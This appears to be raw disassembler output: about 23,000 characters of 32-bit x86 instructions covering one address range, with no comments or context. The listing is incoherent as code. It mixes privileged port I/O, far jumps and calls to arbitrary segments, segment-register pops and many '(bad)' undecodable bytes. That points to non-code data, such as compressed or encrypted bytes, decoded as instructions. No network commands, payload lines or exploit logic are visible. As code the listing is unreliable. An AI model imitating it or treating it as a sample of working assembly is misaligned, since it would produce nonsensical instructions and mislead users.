  41265c:	test   BYTE PTR ds:0xa17d0e23,cl
  412662:	call   0xa40994f3
  412667:	lds    edi,FWORD PTR [ecx+0x5b]
  41266a:	jb     0x412683
  41266c:	push   ebp
  41266d:	push   0xffffffce
  41266f:	stos   BYTE PTR es:[edi],al
  412670:	rol    al,0xb4
  412673:	ss jnp 0x412623
  412676:	mov    ecx,0x6820dbbd
  41267b:	push   0x9b623a22
  412680:	popf   
  412681:	outs   dx,DWORD PTR ds:[esi]
  412682:	aad    0x8b
  412684:	das    
  412685:	mov    edi,0x41522a38
  41268a:	clc    
  41268b:	loope  0x412702
  41268d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41268e:	and    al,BYTE PTR [edi+0x3a]
  412691:	xchg   ecx,eax
  412692:	cwde   
  412693:	lds    edi,FWORD PTR [ebp+eiz*8-0x4fc63765]
  41269a:	pop    ss
  41269b:	pop    ecx
  41269c:	fwait
  41269d:	adc    BYTE PTR [edi+0x51],ch
  4126a0:	mov    dh,0xc6
  4126a2:	bound  esp,QWORD PTR [ebx]
  4126a4:	mov    DWORD PTR [ecx+0x68],ecx
  4126a7:	ja     0x41265f
  4126a9:	lock imul BYTE PTR [esp+eax*4+0x203f01ef]
  4126b1:	xor    al,0x22
  4126b3:	sbb    BYTE PTR [ebx+0x1b44588a],0x17
  4126ba:	cdq    
  4126bb:	push   ds
  4126bc:	xchg   edx,eax
  4126bd:	push   es
  4126be:	push   0x42
  4126c0:	fbstp  TBYTE PTR [ebx]
  4126c2:	adc    esi,esi
  4126c4:	jp     0x4126d0
  4126c6:	and    eax,0x304486e3
  4126cb:	add    bh,BYTE PTR [edi+0x54ba0fb8]
  4126d1:	sbb    ebx,DWORD PTR [ebp-0x69c90af8]
  4126d7:	mov    dl,0xf3
  4126d9:	aas    
  4126da:	call   0xd2f2:0x2bdbc05a
  4126e1:	in     eax,dx
  4126e2:	aaa    
  4126e3:	push   ebp
  4126e4:	out    0x97,eax
  4126e6:	adc    DWORD PTR [eax+0x49cb5654],ebp
  4126ec:	repz imul esp,ecx,0x3c1587ec
  4126f3:	out    dx,eax
  4126f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4126f5:	push   ss
  4126f6:	arpl   WORD PTR [eax-0x7e],ax
  4126f9:	mov    edx,0x82b5cd46
  4126fe:	sbb    al,0xc5
  412700:	ret    0xd2bf
  412703:	in     eax,dx
  412704:	xchg   esi,eax
  412705:	cmp    esi,ebx
  412707:	push   cs
  412708:	inc    eax
  412709:	xor    al,0x8d
  41270b:	stos   BYTE PTR es:[edi],al
  41270c:	add    DWORD PTR [edx],0x7249b3f3
  412712:	inc    edi
  412714:	std    
  412715:	rol    eax,cl
  412717:	push   0x5628ec59
  41271c:	fwait
  41271d:	ret    0xcbb7
  412720:	leave  
  412721:	mov    bh,dh
  412723:	dec    esi
  412724:	aas    
  412725:	or     bh,al
  412727:	call   0x50cb681a
  41272c:	mov    ds,WORD PTR [ebx]
  41272e:	fist   DWORD PTR [edi-0x61e5723]
  412734:	cld    
  412735:	repz clc 
  412737:	jns    0x4126d1
  412739:	in     al,dx
  41273a:	dec    ebx
  41273b:	sahf   
  41273c:	fsubrp st(6),st
  41273e:	jb     0x412786
  412740:	mov    bh,0x39
  412742:	leave  
  412743:	inc    edx
  412744:	and    DWORD PTR [ecx],0xe09f4c7c
  41274a:	mov    DWORD PTR [ebx+0x3d1a2e06],edx
  412750:	(bad)  
  412751:	stc    
  412752:	or     al,0x51
  412754:	cmp    al,0xc9
  412756:	sbb    edi,DWORD PTR [ebx+0x22]
  412759:	mov    ebx,0xedb409e1
  41275e:	pop    eax
  41275f:	pop    esi
  412760:	mov    eax,0xb22731b0
  412765:	sbb    al,0xbd
  412767:	push   cs
  412768:	add    al,0x1
  41276a:	ror    BYTE PTR [ebp+ebx*8-0x40],1
  41276e:	jge    0x4127e3
  412770:	pop    edi
  412771:	in     eax,dx
  412772:	call   0xd55b:0x7fb35fae
  412779:	push   edx
  41277a:	dec    edx
  41277b:	mov    ds:0x8a777ed4,eax
  412780:	fimul  DWORD PTR [eax]
  412782:	test   eax,0xb8ef3380
  412787:	clc    
  412788:	imul   ecx,DWORD PTR [edx+0x1],0x8b5eb2a
  41278f:	fwait
  412790:	pop    esp
  412791:	pop    edi
  412792:	mul    BYTE PTR [edi-0x576dc702]
  412798:	xor    DWORD PTR [eax+eax*8],esp
  41279b:	fidivr WORD PTR [edi+0x24725a38]
  4127a1:	outs   dx,BYTE PTR ds:[esi]
  4127a2:	out    dx,al
  4127a3:	cmp    dh,BYTE PTR [edi+0x4e4251ad]
  4127a9:	mov    ebx,edi
  4127ab:	sbb    eax,DWORD PTR [edx+esi*2+0x64]
  4127af:	int    0x11
  4127b1:	enter  0xe4f0,0xb2
  4127b5:	cmc    
  4127b6:	mov    esi,0xb5e92140
  4127bb:	es jle 0x412760
  4127be:	aad    0x1a
  4127c0:	or     DWORD PTR [esi+0x3c7567a8],esp
  4127c6:	push   0xaebd9c2c
  4127cb:	sahf   
  4127cc:	int    0x71
  4127ce:	mov    ch,0x34
  4127d0:	mov    al,0x52
  4127d2:	and    eax,0xbca341f2
  4127d7:	jnp    0x4127dd
  4127d9:	ret    0x5b3f
  4127dc:	lds    edx,FWORD PTR [ebx]
  4127de:	shl    edx,cl
  4127e0:	mov    esi,0x228949c7
  4127e5:	cli    
  4127e6:	in     eax,0xdb
  4127e8:	push   DWORD PTR [ecx]
  4127ea:	call   0x1913e9a2
  4127ef:	push   ebx
  4127f0:	add    BYTE PTR [esi-0x69],0xa
  4127f4:	pop    ecx
  4127f5:	push   ecx
  4127f6:	inc    ebp
  4127f7:	jne    0x41285f
  4127f9:	push   eax
  4127fa:	jne    0x4127ca
  4127fc:	mov    al,ds:0x1d4b76d6
  412801:	adc    dl,BYTE PTR [edi+0x1cb7709]
  412807:	push   edi
  412808:	and    edi,DWORD PTR [edi-0x32]
  41280b:	fiadd  WORD PTR [eax-0x7ed2e588]
  412811:	sbb    al,BYTE PTR [ebp-0x719cc767]
  412817:	xchg   esp,eax
  412818:	lods   eax,DWORD PTR ds:[esi]
  412819:	inc    edx
  41281a:	popa   
  41281b:	xchg   esp,eax
  41281c:	pop    ebx
  41281d:	rol    BYTE PTR [ebp+ebp*1-0x60],0x3b
  412822:	xor    al,0x38
  412824:	ror    BYTE PTR [esi],1
  412826:	pushf  
  412827:	inc    ebp
  412828:	pop    edx
  412829:	aaa    
  41282a:	xchg   ebp,eax
  41282b:	mov    fs,esp
  41282d:	in     al,dx
  41282e:	mov    ds:0x3dbb003c,eax
  412833:	fstp   DWORD PTR [edx+0x4a]
  412836:	xchg   edi,eax
  412837:	push   ebx
  412838:	call   0xbf6a:0xb100f2cf
  41283f:	dec    ecx
  412840:	xor    DWORD PTR [eax],ebp
  412842:	cmc    
  412843:	adc    al,0x2f
  412845:	int    0x70
  412847:	sbb    ebp,edx
  412849:	push   ebp
  41284a:	push   ecx
  41284b:	mov    al,0x56
  41284d:	stc    
  41284e:	jno    0x41289d
  412850:	mov    eax,ds:0x130e24cc
  412855:	push   ebx
  412856:	jns    0x41281d
  412858:	inc    ebx
  412859:	cmp    esi,DWORD PTR [eax-0x6]
  41285c:	push   cs
  41285d:	mov    dh,0xf2
  41285f:	fcomp  QWORD PTR [ecx+0x1186250a]
  412865:	cmp    eax,DWORD PTR [ecx]
  412867:	xchg   edx,eax
  412868:	xor    edx,ecx
  41286a:	pop    eax
  41286b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41286c:	add    ax,0xe561
  412870:	inc    edi
  412871:	enter  0x28ab,0x23
  412875:	sti    
  412876:	fnstcw WORD PTR [edx]
  412878:	push   esp
  412879:	(bad)  
  41287a:	stc    
  41287b:	mov    ebx,0xb699a615
  412880:	and    al,0x17
  412882:	(bad)  
  412883:	cld    
  412884:	inc    ebp
  412885:	push   ds
  412886:	enter  0x1f68,0xd1
  41288a:	inc    ebp
  41288b:	mov    ah,0x56
  41288d:	out    0x71,al
  41288f:	sbb    eax,0x6eb0f30
  412894:	mov    ds:0xbe317e09,eax
  412899:	fisubr DWORD PTR [esi+edi*1-0x22e9f8f9]
  4128a0:	stos   DWORD PTR es:[edi],eax
  4128a1:	ret    
  4128a2:	(bad)  
  4128a3:	jnp    0x4128ce
  4128a5:	fsub   QWORD PTR [ecx-0x54f43758]
  4128ab:	adc    ch,BYTE PTR [ebx]
  4128ad:	pop    ecx
  4128ae:	fld    DWORD PTR [eax-0x49]
  4128b1:	adc    dh,0x72
  4128b4:	dec    edx
  4128b5:	push   edx
  4128b6:	pop    esi
  4128b7:	lds    esp,FWORD PTR [ebx+eiz*1]
  4128ba:	sbb    eax,0x5b2af8c
  4128bf:	shl    BYTE PTR [edi],1
  4128c1:	test   bl,dh
  4128c3:	lahf   
  4128c4:	or     BYTE PTR [ecx+0x5337313d],dl
  4128ca:	test   al,0x19
  4128cc:	pop    ds
  4128cd:	sbb    eax,0x879c8ff
  4128d2:	lods   eax,DWORD PTR ds:[esi]
  4128d3:	(bad)  
  4128d4:	in     eax,dx
  4128d5:	in     eax,dx
  4128d6:	jmp    0x3a47:0xfd7442
  4128dd:	dec    edx
  4128de:	jns    0x412908
  4128e0:	(bad)  
  4128e1:	jg     0x412877
  4128e3:	adc    al,0xb2
  4128e5:	(bad)  
  4128e6:	mov    esp,0xb6624068
  4128eb:	mov    edi,0x2f22787
  4128f0:	jne    0x412875
  4128f2:	push   ebp
  4128f3:	cmp    eax,0xfd0143a0
  4128f8:	xchg   esp,eax
  4128f9:	mov    ebx,esi
  4128fb:	in     eax,dx
  4128fc:	shr    DWORD PTR [ebp-0x2f6e3c96],0x37
  412903:	fbld   TBYTE PTR [ecx-0x6e]
  412906:	pop    edx
  412907:	mov    BYTE PTR [ebp+0x4eda0384],bl
  41290d:	fst    DWORD PTR [edx+ebp*8]
  412910:	js     0x412961
  412912:	mov    bl,0xab
  412914:	ret    
  412915:	mov    ecx,0x68695191
  41291a:	cld    
  41291b:	mov    ds:0x7f6d18cd,al
  412920:	mov    esi,0xe4391d6a
  412925:	(bad)  [edi-0x74]
  412928:	or     bh,BYTE PTR [ebx]
  41292a:	cmc    
  41292b:	push   0x1cf65c59
  412930:	sub    BYTE PTR [ebp+esi*8-0x1c],dl
  412934:	push   ebx
  412935:	jno    0x412992
  412937:	repnz inc esi
  412939:	imul   ecx,DWORD PTR [eax+ebp*8+0x2c],0xb93a4d2d
  412941:	sub    DWORD PTR [eax],esp
  412943:	neg    BYTE PTR [edx]
  412945:	or     dl,BYTE PTR [edi+0x6f]
  412948:	repnz fldz 
  41294b:	sbb    ch,BYTE PTR es:[edx-0x67]
  41294f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412950:	imul   ecx,DWORD PTR [ebx+0x59],0xef271f71
  412957:	out    dx,al
  412958:	mov    BYTE PTR [ebx-0x16],bl
  41295b:	fild   DWORD PTR [eax+ebp*4-0x4ac3f8d2]
  412962:	sar    eax,0xb1
  412965:	xor    ch,BYTE PTR [ebp+0x12]
  412968:	ins    DWORD PTR es:[edi],dx
  412969:	das    
  41296a:	mov    eax,0x94c0010b
  41296f:	into   
  412970:	retf   
  412971:	xchg   BYTE PTR [edi],ch
  412973:	mov    ch,0x57
  412975:	mov    esp,ebx
  412977:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412978:	mov    ds:0x127a29a4,eax
  41297d:	and    al,0xf8
  41297f:	jg     0x4129e7
  412981:	fs das 
  412983:	leave  
  412984:	int    0x99
  412986:	mov    edx,0x9ec1d8f7
  41298b:	xor    eax,0x68b36886
  412990:	and    edi,DWORD PTR [edi+0x10f92d86]
  412996:	out    dx,al
  412997:	sub    esp,eax
  412999:	dec    esp
  41299a:	cmc    
  41299b:	jno    0x412993
  41299d:	sub    ebp,ebx
  41299f:	test   edx,edi
  4129a1:	mov    al,0xf3
  4129a3:	fucomp st(5)
  4129a5:	xor    DWORD PTR [eax-0x3a502e91],eax
  4129ab:	xor    edx,esi
  4129ad:	jns    0x412956
  4129af:	xor    al,0xba
  4129b1:	test   BYTE PTR [edi+0xc],cl
  4129b4:	jge    0x412963
  4129b6:	pushf  
  4129b7:	and    DWORD PTR [edx-0x119c1d3d],edi
  4129bd:	adc    al,BYTE PTR [ebx+ebx*4-0x3f]
  4129c1:	mov    edx,0xb533ab2d
  4129c6:	sbb    BYTE PTR [edi-0x372dc2a8],0x9a
  4129cd:	jae    0x4129b6
  4129cf:	pop    esp
  4129d0:	pop    eax
  4129d1:	dec    ebx
  4129d2:	pop    esi
  4129d3:	(bad)  
  4129d4:	jge    0x412975
  4129d6:	stc    
  4129d7:	aas    
  4129d8:	dec    ebp
  4129d9:	inc    esi
  4129da:	xchg   ebp,eax
  4129db:	cs call 0xdda2:0xb17852f
  4129e3:	lods   eax,DWORD PTR ds:[esi]
  4129e4:	mov    bl,0xb7
  4129e6:	imul   edi,DWORD PTR [ecx],0xee8b003b
  4129ec:	push   ss
  4129ed:	or     dl,BYTE PTR [ebp+0x7ee7f81f]
  4129f3:	adc    BYTE PTR [edx-0x2c],al
  4129f6:	in     eax,dx
  4129f7:	adc    ah,dh
  4129f9:	xchg   dl,cl
  4129fb:	stc    
  4129fc:	fstp   TBYTE PTR [ebx]
  4129fe:	mov    dh,BYTE PTR [eax+ebp*1-0x61]
  412a02:	cli    
  412a03:	or     ch,al
  412a05:	or     edx,ecx
  412a07:	sbb    DWORD PTR [ebp+ebp*4+0x28d9cf3d],ebp
  412a0e:	mov    edi,0x350a5410
  412a13:	adc    DWORD PTR [ebx],ecx
  412a15:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412a16:	xor    BYTE PTR [ecx],al
  412a18:	sbb    bh,ch
  412a1a:	mov    ch,0xcc
  412a1c:	xor    DWORD PTR [eax],edx
  412a1e:	lock je 0x4129f5
  412a21:	repz int3 
  412a23:	pop    ss
  412a24:	push   esi
  412a25:	sub    BYTE PTR [ebp+eiz*4-0x21],ch
  412a29:	lods   al,BYTE PTR ds:[esi]
  412a2a:	xchg   BYTE PTR [eax+ebx*2],ah
  412a2d:	or     bh,BYTE PTR [ebx+0x6]
  412a30:	jnp    0x4129f4
  412a32:	mov    eax,ds:0x8a1da5f0
  412a37:	mov    ecx,0xa937a58e
  412a3c:	fld    DWORD PTR [eax+0x1]
  412a3f:	mov    edi,0x66c6f96e
  412a44:	or     DWORD PTR [esp+edx*4],edi
  412a47:	push   eax
  412a48:	or     ch,BYTE PTR [ebp+ebx*4+0x7]
  412a4c:	xchg   esi,eax
  412a4d:	mov    DWORD PTR [eax],eax
  412a4f:	xor    al,0x6c
  412a51:	call   0x3e473d08
  412a56:	inc    ebx
  412a57:	mov    WORD PTR [ecx+eax*1],cs
  412a5a:	push   ds
  412a5b:	adc    al,0xc4
  412a5d:	ins    DWORD PTR es:[edi],dx
  412a5e:	(bad)  [eax-0x1b]
  412a61:	jecxz  0x412adb
  412a63:	inc    ecx
  412a64:	and    eax,0xa27fd8bd
  412a69:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412a6a:	or     eax,0x9930c7f7
  412a6f:	sub    BYTE PTR [ecx-0x5657992d],0xf0
  412a76:	jp     0x412a5a
  412a78:	popa   
  412a79:	xchg   ebp,eax
  412a7a:	ins    BYTE PTR es:[edi],dx
  412a7b:	inc    ebx
  412a7c:	jg     0x412a77
  412a7e:	stc    
  412a7f:	nop
  412a80:	sbb    DWORD PTR [ebx-0x61fee59e],esp
  412a86:	test   BYTE PTR [ebx+ecx*1],ah
  412a89:	fwait
  412a8a:	js     0x412b04
  412a8c:	dec    ecx
  412a8d:	in     al,0x69
  412a8f:	lahf   
  412a90:	dec    eax
  412a91:	test   eax,0xe812e221
  412a96:	sub    ebp,DWORD PTR [edi+0x5b23f1b5]
  412a9c:	fisttp DWORD PTR [eax-0x35c4ac9e]
  412aa2:	inc    ebx
  412aa3:	mov    bh,0x46
  412aa5:	jbe    0x412a8e
  412aa7:	in     al,0xd1
  412aa9:	out    0x83,al
  412aab:	adc    ecx,esp
  412aad:	enter  0xe5b4,0xda
  412ab1:	and    eax,0xf6d6f8a5
  412ab6:	xor    al,0xe4
  412ab8:	add    edx,ecx
  412aba:	cmp    cl,BYTE PTR [ecx+0x269dda55]
  412ac0:	ret    
  412ac1:	sub    eax,0x289d8009
  412ac6:	jmp    0x36fe:0x17b9b234
  412acd:	jbe    0x412a6b
  412acf:	and    DWORD PTR [ecx-0x58],0x91a7d667
  412ad6:	fcmovne st,st(4)
  412ad8:	popf   
  412ad9:	mov    esi,0x464c6a79
  412ade:	out    0x19,eax
  412ae0:	sbb    eax,0x24cea8e7
  412ae5:	sbb    BYTE PTR [edx+0x54],ch
  412ae8:	and    ecx,DWORD PTR [ebx+eax*4]
  412aeb:	push   ss
  412aec:	cmp    BYTE PTR [ebp+0x3d],ch
  412aef:	hlt    
  412af0:	push   ss
  412af1:	add    BYTE PTR [edi],ch
  412af3:	sti    
  412af4:	pop    edi
  412af5:	je     0x412ace
  412af7:	add    eax,0x287c4c94
  412afc:	dec    edx
  412afd:	push   ebx
  412afe:	fstp   DWORD PTR [edx+0x1d]
  412b01:	mov    edx,0x555470e3
  412b06:	mov    bh,0xc0
  412b08:	popa   
  412b09:	xor    eax,0x9efc0bd3
  412b0e:	sub    eax,0x74156aa9
  412b13:	adc    DWORD PTR [edi-0xc806e69],esi
  412b19:	stos   BYTE PTR es:[edi],al
  412b1a:	test   eax,0xde31f2e9
  412b1f:	in     eax,0x47
  412b21:	ins    BYTE PTR es:[edi],dx
  412b22:	rol    esi,cl
  412b24:	jge    0x412b91
  412b26:	push   esi
  412b27:	jecxz  0x412b3e
  412b29:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412b2a:	or     esp,DWORD PTR [ecx]
  412b2c:	rcl    BYTE PTR [edi],cl
  412b2e:	jne    0x412b1f
  412b30:	mov    esp,0xca55c18c
  412b35:	cwde   
  412b36:	push   es
  412b37:	sub    esi,DWORD PTR [esi+0x44]
  412b3a:	addr16 dec eax
  412b3c:	jns    0x412b48
  412b3e:	mov    esp,0x2f6f66a7
  412b43:	lahf   
  412b44:	stos   DWORD PTR es:[edi],eax
  412b45:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412b46:	xadd   BYTE PTR [ebp+0x32f2af5],bh
  412b4d:	shr    DWORD PTR [eax],1
  412b4f:	xchg   esp,eax
  412b50:	inc    ecx
  412b51:	add    BYTE PTR [ecx+0x64],ah
  412b54:	xchg   esp,edx
  412b56:	shl    DWORD PTR [ebx+0x32],1
  412b59:	push   ebp
  412b5a:	sub    al,0x93
  412b5c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412b5d:	js     0x412b5f
  412b5f:	jl     0x412ae7
  412b61:	(bad)  
  412b62:	xlat   BYTE PTR ds:[ebx]
  412b63:	mov    al,ds:0x4c793af
  412b68:	mov    dh,0x48
  412b6a:	sbb    esi,DWORD PTR [esi-0x48]
  412b6d:	cmp    BYTE PTR [eax+0x7b],0x41
  412b71:	push   0x46
  412b73:	pop    esi
  412b74:	inc    esi
  412b75:	fs mov bh,0x9e
  412b78:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412b79:	jae    0x412b34
  412b7b:	mov    WORD PTR [ebx+eiz*2-0x1687b14e],ds
  412b82:	fstp   DWORD PTR [edx+0x6f98ee42]
  412b88:	mov    dl,0xf
  412b8a:	hlt    
  412b8b:	jae    0x412b7f
  412b8d:	adc    al,0x41
  412b8f:	xlat   BYTE PTR ds:[ebx]
  412b90:	(bad)  
  412b91:	mov    bh,0x7
  412b93:	dec    esi
  412b94:	fdiv   DWORD PTR [ebp+0x79]
  412b97:	out    dx,eax
  412b98:	mov    ebx,0x276dc777
  412b9d:	mov    dl,0xb8
  412b9f:	jmp    0x9009:0x4266ceba
  412ba6:	fst    QWORD PTR [ecx+0x2d330449]
  412bac:	and    dl,ah
  412bae:	std    
  412baf:	push   eax
  412bb0:	jg     0x412b38
  412bb2:	into   
  412bb3:	dec    esp
  412bb4:	xchg   ebx,eax
  412bb5:	push   edi
  412bb6:	mov    ebp,0xb1486375
  412bbb:	jnp    0x412c38
  412bbd:	cmp    BYTE PTR gs:[eax],ch
  412bc0:	jmp    0x623:0xe0a08a42
  412bc7:	popf   
  412bc8:	and    eax,0xb07cff18
  412bcd:	inc    ecx
  412bce:	dec    edi
  412bcf:	ret    0xdbb3
  412bd2:	inc    edx
  412bd3:	mov    eax,0x4afa8ce4
  412bd8:	popa   
  412bd9:	cmp    eax,0xac1ea405
  412bde:	(bad)  
  412bdf:	xor    DWORD PTR [ecx+ebx*4-0x49],ebp
  412be3:	jnp    0x412bd6
  412be5:	dec    esi
  412be6:	mov    esp,0x60420f4b
  412beb:	ret    
  412bec:	add    al,0x4d
  412bee:	push   ebx
  412bef:	xor    ebp,ebx
  412bf1:	pop    ebp
  412bf2:	iret   
  412bf3:	pop    edi
  412bf4:	dec    ebp
  412bf5:	out    0x4b,eax
  412bf7:	and    al,0xea
  412bf9:	(bad)  
  412bfa:	(bad)  
  412bfb:	out    0xbe,al
  412bfd:	jnp    0x412c47
  412bff:	add    BYTE PTR [ebx+eiz*4],al
  412c02:	jecxz  0x412b8c
  412c04:	hlt    
  412c05:	cmp    bh,al
  412c07:	rol    dh,1
  412c09:	out    dx,al
  412c0a:	jge    0x412c25
  412c0c:	lock ror BYTE PTR [eax-0x6fc822be],1
  412c13:	aam    0xb5
  412c15:	mov    DWORD PTR [eax+0x25],0x742f3662
  412c1c:	loop   0x412c3f
  412c1e:	daa    
  412c1f:	pop    ds
  412c20:	int    0xfa
  412c22:	push   esi
  412c23:	cld    
  412c24:	xchg   BYTE PTR [ecx-0x45bb970e],al
  412c2a:	shl    DWORD PTR [esi-0x6f753c9f],0x88
  412c31:	push   esi
  412c32:	and    BYTE PTR [ebx-0x1c],al
  412c35:	or     al,BYTE PTR [edx]
  412c37:	stc    
  412c38:	sahf   
  412c39:	nop
  412c3a:	std    
  412c3b:	ret    0x6b43
  412c3e:	pop    ss
  412c3f:	push   0x66
  412c41:	std    
  412c42:	push   cs
  412c43:	test   al,0x42
  412c45:	dec    ebx
  412c46:	(bad)  
  412c47:	(bad)  
  412c48:	loope  0x412cb1
  412c4a:	mov    edi,0xd7463105
  412c4f:	jne    0x412c42
  412c51:	mov    fs,WORD PTR [ebp-0x3d072497]
  412c57:	dec    ebx
  412c58:	mov    ah,0x1c
  412c5a:	xchg   DWORD PTR [edi],edx
  412c5c:	aad    0x70
  412c5e:	pop    es
  412c5f:	pop    ebp
  412c60:	xchg   esp,eax
  412c61:	addr16 push cs
  412c63:	sbb    dh,BYTE PTR [edi+0x21dfae95]
  412c69:	loopne 0x412cac
  412c6b:	mov    ah,0x39
  412c6d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412c6e:	cwde   
  412c6f:	jle    0x412c2a
  412c71:	ins    DWORD PTR es:[edi],dx
  412c72:	in     eax,dx
  412c73:	sbb    eax,0xe3fdac62
  412c78:	scas   eax,DWORD PTR es:[edi]
  412c79:	jmp    0x412c2f
  412c7b:	xor    DWORD PTR [edi],0x6ee70fbf
  412c81:	push   ds
  412c82:	stos   BYTE PTR es:[edi],al
  412c83:	mov    al,ds:0xc644164b
  412c88:	test   al,0x52
  412c8a:	out    0xd6,eax
  412c8c:	mov    al,ds:0xb43d7609
  412c91:	std    
  412c92:	outs   dx,DWORD PTR ds:[esi]
  412c93:	lods   al,BYTE PTR ds:[esi]
  412c94:	rol    DWORD PTR [ebp+ecx*4+0x3e],cl
  412c98:	xlat   BYTE PTR ds:[ebx]
  412c99:	rcr    DWORD PTR [edi-0x3c76302b],0x6c
  412ca0:	xchg   ecx,eax
  412ca1:	ja     0x412cfe
  412ca3:	jnp    0x412cc9
  412ca5:	mov    ebp,0xd4c9326b
  412caa:	pop    esi
  412cab:	inc    ebx
  412cac:	icebp  
  412cad:	ja     0x412cd2
  412caf:	in     al,dx
  412cb0:	inc    ecx
  412cb1:	or     ebx,edx
  412cb3:	mov    eax,0x95d6cd0c
  412cb8:	or     al,0xbc
  412cba:	adc    al,BYTE PTR [ecx]
  412cbc:	pop    eax
  412cbd:	pop    ss
  412cbe:	repz lahf 
  412cc0:	xchg   ebp,eax
  412cc1:	mov    DWORD PTR [edx-0x46],esp
  412cc4:	or     edx,DWORD PTR [ecx]
  412cc6:	sbb    al,0xb9
  412cc8:	cmp    al,BYTE PTR [eax-0x1b7fb9c6]
  412cce:	lahf   
  412ccf:	fistp  WORD PTR [ebp+eax*1+0x40aef40c]
  412cd6:	cmp    DWORD PTR [esi],ebp
  412cd8:	hlt    
  412cd9:	mov    edx,DWORD PTR [edi]
  412cdb:	imul   ecx,ebx,0x26916fd
  412ce1:	(bad)  
  412ce2:	pop    ecx
  412ce3:	xor    esi,edi
  412ce5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412ce6:	and    ebp,DWORD PTR [ebx+0x36]
  412ce9:	mov    bl,0xb6
  412ceb:	aas    
  412cec:	rcl    BYTE PTR [ebx-0x43],cl
  412cef:	xchg   cl,cl
  412cf1:	add    bh,al
  412cf3:	mov    ecx,0xa6bf29c2
  412cf8:	aas    
  412cf9:	fsub   DWORD PTR [esp+edx*2+0x6c121c25]
  412d00:	mov    ah,0x2b
  412d02:	ds sub cl,al
  412d05:	push   edx
  412d06:	cmp    eax,0x240cb960
  412d0b:	icebp  
  412d0c:	push   ebx
  412d0d:	push   0x50
  412d0f:	sbb    edx,esp
  412d11:	loopne 0x412d64
  412d13:	sbb    bl,BYTE PTR [edx]
  412d15:	add    DWORD PTR [esi+0x456ed472],ebp
  412d1b:	add    ch,BYTE PTR [esi+eiz*2+0xe3555b3]
  412d22:	cmp    eax,0x7ee20f4c
  412d27:	push   edx
  412d28:	add    esi,edi
  412d2a:	xchg   edx,eax
  412d2b:	sbb    eax,0x5d48234f
  412d30:	jecxz  0x412d3f
  412d32:	dec    ecx
  412d33:	add    DWORD PTR [edi+0x5be70a76],edx
  412d39:	in     al,dx
  412d3a:	fsubp  st(7),st
  412d3c:	or     al,0xed
  412d3e:	es stos DWORD PTR es:[edi],eax
  412d40:	xchg   edx,eax
  412d41:	cmp    ebp,ebp
  412d43:	ins    BYTE PTR es:[edi],dx
  412d44:	loop   0x412d2f
  412d46:	pop    edx
  412d47:	push   esi
  412d48:	lock repnz dec esp
  412d4b:	sbb    al,0xb8
  412d4d:	sbb    bl,dh
  412d4f:	xchg   esi,eax
  412d50:	cmp    al,0x4e
  412d52:	bound  edx,QWORD PTR [edi]
  412d54:	xchg   edx,eax
  412d55:	fistp  DWORD PTR [ebx-0x7252b1ab]
  412d5b:	mov    ebp,0x5a6d5de4
  412d60:	pop    edi
  412d61:	pop    ss
  412d62:	and    BYTE PTR ss:[edx+ecx*8+0x6a8072e8],bh
  412d6a:	daa    
  412d6b:	retf   0xdf2d
  412d6e:	mov    dh,BYTE PTR [edi]
  412d70:	dec    DWORD PTR [ebx-0x2f83b83c]
  412d76:	pop    es
  412d77:	xchg   esi,eax
  412d78:	jb     0x412dee
  412d7a:	dec    ebx
  412d7b:	in     eax,0x61
  412d7d:	pop    es
  412d7e:	aaa    
  412d7f:	clc    
  412d80:	push   esp
  412d81:	mov    bh,0x71
  412d83:	ret    
  412d84:	inc    eax
  412d85:	xchg   ecx,eax
  412d86:	loop   0x412dca
  412d88:	sbb    al,0x3f
  412d8a:	ins    BYTE PTR es:[edi],dx
  412d8b:	(bad)  
  412d8d:	fs jb  0x412d18
  412d90:	add    edi,ecx
  412d92:	div    esp
  412d94:	xchg   BYTE PTR [edi+0x282e53a4],dl
  412d9a:	dec    ebp
  412d9b:	jns    0x412dc5
  412d9d:	(bad)  [ecx]
  412d9f:	data16 sahf 
  412da1:	call   0xb446:0x201c851b
  412da8:	repz out 0xd1,eax
  412dab:	sti    
  412dac:	adc    DWORD PTR [ebp-0x6011ae6b],ebx
  412db2:	cmp    DWORD PTR [edx],eax
  412db4:	sub    BYTE PTR [esi],ch
  412db6:	jo     0x412de7
  412db8:	or     BYTE PTR [edx+0x5b],dh
  412dbb:	fmul   DWORD PTR [esi-0x3c2df91e]
  412dc1:	aad    0xd1
  412dc3:	fnstsw WORD PTR [ebp-0x30c25392]
  412dc9:	sbb    eax,DWORD PTR [edi+0x74]
  412dcc:	push   edi
  412dcd:	sub    eax,0x91f53fd8
  412dd2:	int3   
  412dd3:	fdivrp st(3),st
  412dd5:	dec    edi
  412dd6:	xchg   esp,eax
  412dd7:	fsubr  DWORD PTR [edx+eiz*8+0x5d]
  412ddb:	fwait
  412ddc:	sub    dh,BYTE PTR [eax+0x2f]
  412ddf:	inc    esi
  412de0:	xchg   ebx,eax
  412de1:	add    ecx,DWORD PTR [edx]
  412de3:	mov    al,ds:0x63481253
  412de8:	inc    edi
  412de9:	push   edx
  412dea:	push   edx
  412deb:	push   edi
  412dec:	aad    0xe3
  412dee:	cmp    BYTE PTR [ebp+0x21b3f036],dh
  412df4:	jmp    0x412dc4
  412df6:	loopne 0x412d95
  412df8:	mov    cl,0x6a
  412dfa:	pop    ebp
  412dfb:	js     0x412de9
  412dfd:	icebp  
  412dfe:	inc    edi
  412dff:	retf   0xb62a
  412e02:	aam    0xf5
  412e04:	xor    bl,BYTE PTR [edx]
  412e06:	adc    eax,0x3d0574d2
  412e0b:	fidiv  WORD PTR [edx-0x44075c6b]
  412e11:	or     eax,0x1410c94b
  412e16:	int3   
  412e17:	leave  
  412e18:	adc    edi,DWORD PTR [esi]
  412e1a:	cmc    
  412e1b:	hlt    
  412e1c:	xchg   ebx,eax
  412e1d:	(bad)  
